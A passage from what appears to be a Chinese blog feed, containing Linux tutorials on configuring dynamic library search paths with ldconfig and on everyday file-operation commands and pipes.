class="line-numbers language-lua" data-language="lua"><code class="language-lua">glibc<span class="token punctuation">.</span>confx86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token punctuation">.</span>conf<span class="token keyword">local</span><span class="token punctuation">.</span>conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>文件示例</strong>：</p><ul><li><p>/etc/ld.so.conf.d/local.conf：</p><pre class="line-numbers language-vbnet" data-language="vbnet"><code class="language-vbnet"><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token keyword">lib</span><span class="token operator">/</span>opt<span class="token operator">/</span>custom<span class="token operator">/</span><span class="token keyword">lib</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><p>这些路径会被动态链接器添加到库搜索路径中。</p><hr><h3 id="四、如何配置动态库路径"><a href="#四、如何配置动态库路径" class="headerlink" title="四、如何配置动态库路径"></a><strong>四、如何配置动态库路径</strong></h3><h4 id="1-添加自定义路径"><a href="#1-添加自定义路径" class="headerlink" title="1. 添加自定义路径"></a><strong>1. 添加自定义路径</strong></h4><p>假设有一个自定义动态库路径 <code>/home/user/mylibs</code>，以下是配置步骤：</p><ol><li><p><strong>创建配置文件</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">nano</span> /etc/ld.so.conf.d/mylibs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/home/user/mylibs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>更新动态库缓存</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>验证是否生效</strong>： 查看是否包含新路径：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ldconfig <span class="token parameter variable">-p</span> <span class="token operator">|</span> <span class="token function">grep</span> mylibs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><hr><h4 id="2-临时配置路径"><a href="#2-临时配置路径" class="headerlink" title="2. 临时配置路径"></a><strong>2. 临时配置路径</strong></h4><p>如果只是临时测试动态库路径，可以使用 <code>LD_LIBRARY_PATH</code> 环境变量：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span>/home/user/mylibs:<span class="token variable">$LD_LIBRARY_PATH</span>./myprogram<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>注意</strong>：这种方法仅对当前终端会话有效。</p><hr><h3 id="五、ldconfig-的作用"><a href="#五、ldconfig-的作用" class="headerlink" title="五、ldconfig 的作用"></a><strong>五、<code>ldconfig</code> 的作用</strong></h3><p><code>ldconfig</code> 是管理动态库缓存的工具，其作用包括：</p><ol><li><strong>扫描路径</strong>：根据 <code>/etc/ld.so.conf</code> 和 <code>/etc/ld.so.conf.d/</code> 下的配置文件，扫描动态库路径。</li><li><strong>更新缓存</strong>：生成 <code>/etc/ld.so.cache</code> 文件，加速库的加载。</li></ol><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h4><ol><li><p>更新缓存：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>指定路径更新缓存：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ldconfig /home/user/mylibs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看当前缓存的库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ldconfig <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><hr><h3 id="六、动态库配置实例"><a href="#六、动态库配置实例" class="headerlink" title="六、动态库配置实例"></a><strong>六、动态库配置实例</strong></h3><h4 id="1-动态库开发"><a href="#1-动态库开发" class="headerlink" title="1. 动态库开发"></a><strong>1. 动态库开发</strong></h4><p>创建一个简单动态库：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// hello.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, from dynamic library!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译成动态库：</p><pre class="line-numbers language-none"><code class="language-none">gcc -fPIC -shared -o libhello.so hello.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将动态库移动到 <code>/opt/mylibs</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /opt/mylibs<span class="token function">sudo</span> <span class="token function">cp</span> libhello.so /opt/mylibs/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-配置加载路径"><a href="#2-配置加载路径" class="headerlink" title="2. 配置加载路径"></a><strong>2. 配置加载路径</strong></h4><p>创建 <code>/etc/ld.so.conf.d/mylibs.conf</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">nano</span> /etc/ld.so.conf.d/mylibs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/opt/mylibs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新缓存：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-使用动态库"><a href="#3-使用动态库" class="headerlink" title="3. 使用动态库"></a><strong>3. 使用动态库</strong></h4><p>编写一个测试程序：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// main.c</span><span class="token keyword">void</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译并运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-o</span> main main.c <span class="token parameter variable">-lhello</span>./main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Hello, from dynamic library<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="七、排错方法"><a href="#七、排错方法" class="headerlink" title="七、排错方法"></a><strong>七、排错方法</strong></h3><ol><li><p><strong>检查动态库是否存在</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ldconfig <span class="token parameter variable">-p</span> <span class="token operator">|</span> <span class="token function">grep</span> libhello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>验证动态库路径是否正确</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ldd ./main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>动态库无法加载时</strong>：</p><ul><li>检查是否添加了正确的路径到 <code>/etc/ld.so.conf.d</code>。</li><li>检查是否运行了 <code>ldconfig</code>。</li></ul></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux文件操作命令</title>
      <link href="/2024/11/24/linux-wen-jian-cao-zuo-ming-ling/"/>
      <url>/2024/11/24/linux-wen-jian-cao-zuo-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="linux文件操作命令"><a href="#linux文件操作命令" class="headerlink" title="linux文件操作命令"></a>linux文件操作命令</h1><p>以下是 Linux 系统中与文件操作相关的命令，附带常用参数的详细解释。</p><hr><h2 id="1-查看文件和目录"><a href="#1-查看文件和目录" class="headerlink" title="1. 查看文件和目录"></a><strong>1. 查看文件和目录</strong></h2><h3 id="列出目录内容-ls"><a href="#列出目录内容-ls" class="headerlink" title="列出目录内容 (ls)"></a><strong>列出目录内容 (<code>ls</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> <span class="token punctuation">[</span>路径<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>常用选项：</p><ul><li><code>-l</code>：以详细列表形式显示，包括权限、所有者、文件大小、修改时间等。</li><li><code>-a</code>：显示所有文件，包括以 <code>.</code> 开头的隐藏文件。</li><li><code>-h</code>：配合 <code>-l</code>，以人类可读的文件大小显示（如 <code>1K</code>, <code>1M</code>）。</li><li><code>-r</code>：逆序排列。</li><li><code>-t</code>：按时间排序。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-lah</span> /home/user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="查看当前路径-pwd"><a href="#查看当前路径-pwd" class="headerlink" title="查看当前路径 (pwd)"></a><strong>查看当前路径 (<code>pwd</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">pwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>输出当前工作目录的完整路径。</li></ul><hr><h2 id="2-创建文件和目录"><a href="#2-创建文件和目录" class="headerlink" title="2. 创建文件和目录"></a><strong>2. 创建文件和目录</strong></h2><h3 id="创建文件-touch"><a href="#创建文件-touch" class="headerlink" title="创建文件 (touch)"></a><strong>创建文件 (<code>touch</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>功能：创建一个空文件或更新已有文件的时间戳。</li></ul><h3 id="创建目录-mkdir"><a href="#创建目录-mkdir" class="headerlink" title="创建目录 (mkdir)"></a><strong>创建目录 (<code>mkdir</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> 目录名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>常用选项：</p><ul><li><code>-p</code>：递归创建目录。如果父目录不存在，会自动创建。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /home/user/project/logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><h2 id="3-查看文件内容"><a href="#3-查看文件内容" class="headerlink" title="3. 查看文件内容"></a><strong>3. 查看文件内容</strong></h2><h3 id="显示文件内容-cat"><a href="#显示文件内容-cat" class="headerlink" title="显示文件内容 (cat)"></a><strong>显示文件内容 (<code>cat</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>常用选项：</p><ul><li><code>-n</code>：显示行号。</li><li><code>-A</code>：显示所有字符，包括不可见字符。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> <span class="token parameter variable">-n</span> file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="分页查看-less-和-more"><a href="#分页查看-less-和-more" class="headerlink" title="分页查看 (less 和 more)"></a><strong>分页查看 (<code>less</code> 和 <code>more</code>)</strong></h3><ul><li><p>less：分页查看，支持向前滚动。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">less</span> file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>more：逐页查看，按空格翻页。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">more</span> file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><h2 id="4-编辑文件"><a href="#4-编辑文件" class="headerlink" title="4. 编辑文件"></a><strong>4. 编辑文件</strong></h2><h3 id="简单编辑器-nano"><a href="#简单编辑器-nano" class="headerlink" title="简单编辑器 (nano)"></a><strong>简单编辑器 (<code>nano</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nano</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用快捷键（如 <code>Ctrl+O</code> 保存，<code>Ctrl+X</code> 退出）。</li></ul><h3 id="高级编辑器-vim"><a href="#高级编辑器-vim" class="headerlink" title="高级编辑器 (vim)"></a><strong>高级编辑器 (<code>vim</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>基本模式：<ul><li>按 <code>i</code> 进入插入模式。</li><li>编辑完成后按 <code>Esc</code>，输入 <code>:wq</code> 保存并退出。</li></ul></li></ul><hr><h2 id="5-复制、移动和重命名文件"><a href="#5-复制、移动和重命名文件" class="headerlink" title="5. 复制、移动和重命名文件"></a><strong>5. 复制、移动和重命名文件</strong></h2><h3 id="复制文件和目录-cp"><a href="#复制文件和目录-cp" class="headerlink" title="复制文件和目录 (cp)"></a><strong>复制文件和目录 (<code>cp</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> 源文件 目标文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>常用选项：</p><ul><li><code>-r</code>：递归复制目录。</li><li><code>-p</code>：保留文件属性（权限、时间戳等）。</li><li><code>-i</code>：覆盖前提示确认。</li><li><code>-v</code>：显示详细过程。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> <span class="token parameter variable">-rp</span> source_dir/ target_dir/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="移动和重命名-mv"><a href="#移动和重命名-mv" class="headerlink" title="移动和重命名 (mv)"></a><strong>移动和重命名 (<code>mv</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> 源文件 目标文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>常用选项：</p><ul><li><code>-i</code>：覆盖前提示确认。</li><li><code>-v</code>：显示详细过程。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> file1.txt file2.txt  <span class="token comment"># 重命名</span><span class="token function">mv</span> file.txt /path/to/dir/  <span class="token comment"># 移动文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><hr><h2 id="6-删除文件和目录"><a href="#6-删除文件和目录" class="headerlink" title="6. 删除文件和目录"></a><strong>6. 删除文件和目录</strong></h2><h3 id="删除文件和目录-rm"><a href="#删除文件和目录-rm" class="headerlink" title="删除文件和目录 (rm)"></a><strong>删除文件和目录 (<code>rm</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> 文件/目录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>常用选项：</p><ul><li><code>-r</code>：递归删除目录及其内容。</li><li><code>-f</code>：强制删除，无需确认。</li><li><code>-i</code>：删除前提示确认。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> <span class="token parameter variable">-rf</span> /tmp/test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><h2 id="7-搜索文件和内容"><a href="#7-搜索文件和内容" class="headerlink" title="7. 搜索文件和内容"></a><strong>7. 搜索文件和内容</strong></h2><h3 id="查找文件-find"><a href="#查找文件-find" class="headerlink" title="查找文件 (find)"></a><strong>查找文件 (<code>find</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token punctuation">[</span>路径<span class="token punctuation">]</span> <span class="token punctuation">[</span>条件<span class="token punctuation">]</span> <span class="token punctuation">[</span>操作<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>常用条件：</p><ul><li><code>-name</code>：按文件名查找（支持通配符）。</li><li><code>-type</code>：按类型查找，如 <code>f</code>（文件），<code>d</code>（目录）。</li><li><code>-size</code>：按文件大小查找，如 <code>+1M</code>（大于1MB）。</li><li><code>-mtime</code>：按修改时间查找，如 <code>-7</code>（7天内修改的文件）。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /home <span class="token parameter variable">-name</span> <span class="token string">"*.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="搜索文件内容-grep"><a href="#搜索文件内容-grep" class="headerlink" title="搜索文件内容 (grep)"></a><strong>搜索文件内容 (<code>grep</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> <span class="token string">"关键字"</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>常用选项：</p><ul><li><code>-i</code>：忽略大小写。</li><li><code>-r</code>：递归搜索目录。</li><li><code>-n</code>：显示行号。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token parameter variable">-rn</span> <span class="token string">"error"</span> /var/log/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><h2 id="8-修改文件权限"><a href="#8-修改文件权限" class="headerlink" title="8. 修改文件权限"></a><strong>8. 修改文件权限</strong></h2><h3 id="修改权限-chmod"><a href="#修改权限-chmod" class="headerlink" title="修改权限 (chmod)"></a><strong>修改权限 (<code>chmod</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token punctuation">[</span>模式<span class="token punctuation">]</span> 文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>权限格式：</p><ul><li><code>u</code>：用户，<code>g</code>：组，<code>o</code>：其他，<code>a</code>：全部。</li><li><code>+</code>：添加权限，<code>-</code>：删除权限，<code>=</code>：设置权限。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> u+x script.sh    <span class="token comment"># 给用户添加执行权限</span><span class="token function">chmod</span> <span class="token number">755</span> file.txt     <span class="token comment"># 设置读写执行权限</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h3 id="修改所有者-chown"><a href="#修改所有者-chown" class="headerlink" title="修改所有者 (chown)"></a><strong>修改所有者 (<code>chown</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chown</span> <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> 用户:组 文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chown</span> user:group file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><h2 id="9-压缩和解压文件"><a href="#9-压缩和解压文件" class="headerlink" title="9. 压缩和解压文件"></a><strong>9. 压缩和解压文件</strong></h2><h3 id="压缩文件"><a href="#压缩文件" class="headerlink" title="压缩文件"></a><strong>压缩文件</strong></h3><ul><li><p>tar：创建归档文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-czvf</span> archive.tar.gz 文件/目录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>zip：压缩为 ZIP 格式。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> <span class="token parameter variable">-r</span> archive.zip 文件/目录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a><strong>解压文件</strong></h3><ul><li><p>tar：解压 .tar.gz文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-xzvf</span> archive.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>unzip：解压 ZIP 文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> archive.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><h2 id="10-其他常用操作"><a href="#10-其他常用操作" class="headerlink" title="10. 其他常用操作"></a><strong>10. 其他常用操作</strong></h2><h3 id="统计文件行、词、字符数-wc"><a href="#统计文件行、词、字符数-wc" class="headerlink" title="统计文件行、词、字符数 (wc)"></a><strong>统计文件行、词、字符数 (<code>wc</code>)</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wc</span> <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> 文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>常用选项：</p><ul><li><code>-l</code>：统计行数。</li><li><code>-w</code>：统计单词数。</li><li><code>-c</code>：统计字节数。</li></ul></li><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wc</span> <span class="token parameter variable">-l</span> file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="监视文件内容-tail-和-head"><a href="#监视文件内容-tail-和-head" class="headerlink" title="监视文件内容 (tail 和 head)"></a><strong>监视文件内容 (<code>tail</code> 和 <code>head</code>)</strong></h3><ul><li><p>显示文件头部：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">10</span> file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>动态监视文件末尾：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tail</span> <span class="token parameter variable">-f</span> file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><p>在 Linux 中，<strong>管道符 (<code>|</code>)</strong> 是一种强大的工具，用于将一个命令的输出传递给另一个命令作为输入。以下是管道符的详细介绍和常见使用场景。</p><hr><h2 id="管道符语法"><a href="#管道符语法" class="headerlink" title="管道符语法"></a><strong>管道符语法</strong></h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">command1 <span class="token operator">|</span> command2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>command1</code>：第一个命令，生成输出。</li><li><code>|</code>：管道符，将第一个命令的输出传递给第二个命令。</li><li><code>command2</code>：第二个命令，将接收的输入进行处理。</li></ul><hr><h2 id="常见场景和示例"><a href="#常见场景和示例" class="headerlink" title="常见场景和示例"></a><strong>常见场景和示例</strong></h2><h3 id="1-结合-grep-搜索内容"><a href="#1-结合-grep-搜索内容" class="headerlink" title="1. 结合 grep 搜索内容"></a><strong>1. 结合 <code>grep</code> 搜索内容</strong></h3><ul><li><p>查找某目录中包含特定关键词的文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"filename"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>示例：列出当前目录下包含 “log” 的文件名：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"log"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="2-结合-sort-排序"><a href="#2-结合-sort-排序" class="headerlink" title="2. 结合 sort 排序"></a><strong>2. 结合 <code>sort</code> 排序</strong></h3><ul><li><p>按文件大小排序（结合 ls -l）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token parameter variable">-k</span> <span class="token number">5</span> <span class="token parameter variable">-n</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>-k 5</code>：按第 5 列（文件大小）排序。</li><li><code>-n</code>：按数值排序。</li></ul></li></ul><h3 id="3-结合-wc-统计"><a href="#3-结合-wc-统计" class="headerlink" title="3. 结合 wc 统计"></a><strong>3. 结合 <code>wc</code> 统计</strong></h3><ul><li><p>统计当前目录下的文件数量：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>统计文件中的行数、单词数和字符数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> file.txt <span class="token operator">|</span> <span class="token function">wc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="4-结合-head-和-tail-查看内容"><a href="#4-结合-head-和-tail-查看内容" class="headerlink" title="4. 结合 head 和 tail 查看内容"></a><strong>4. 结合 <code>head</code> 和 <code>tail</code> 查看内容</strong></h3><ul><li><p>查看文件的前 10 行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> file.txt <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看文件的最后 10 行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> file.txt <span class="token operator">|</span> <span class="token function">tail</span> <span class="token parameter variable">-n</span> <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="5-结合-cut-提取字段"><a href="#5-结合-cut-提取字段" class="headerlink" title="5. 结合 cut 提取字段"></a><strong>5. 结合 <code>cut</code> 提取字段</strong></h3><ul><li><p>从 ls -l中提取文件权限：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">cut</span> <span class="token parameter variable">-d</span> <span class="token string">' '</span> <span class="token parameter variable">-f</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>-d ' '</code>：以空格为分隔符。</li><li><code>-f 1</code>：提取第 1 列。</li></ul></li></ul><h3 id="6-结合-awk-进行格式化"><a href="#6-结合-awk-进行格式化" class="headerlink" title="6. 结合 awk 进行格式化"></a><strong>6. 结合 <code>awk</code> 进行格式化</strong></h3><ul><li><p>提取文件名和大小：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $5, $9}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>$5</code>：表示文件大小。</li><li><code>$9</code>：表示文件名。</li></ul></li></ul><h3 id="7-结合-uniq-去重"><a href="#7-结合-uniq-去重" class="headerlink" title="7. 结合 uniq 去重"></a><strong>7. 结合 <code>uniq</code> 去重</strong></h3><ul><li><p>统计文件中的唯一单词（结合 sort 和 uniq）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> file.txt <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="8-结合-tee-保存和显示"><a href="#8-结合-tee-保存和显示" class="headerlink" title="8. 结合 tee 保存和显示"></a><strong>8. 结合 <code>tee</code> 保存和显示</strong></h3><ul><li><p>将命令输出保存到文件，同时在终端显示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token 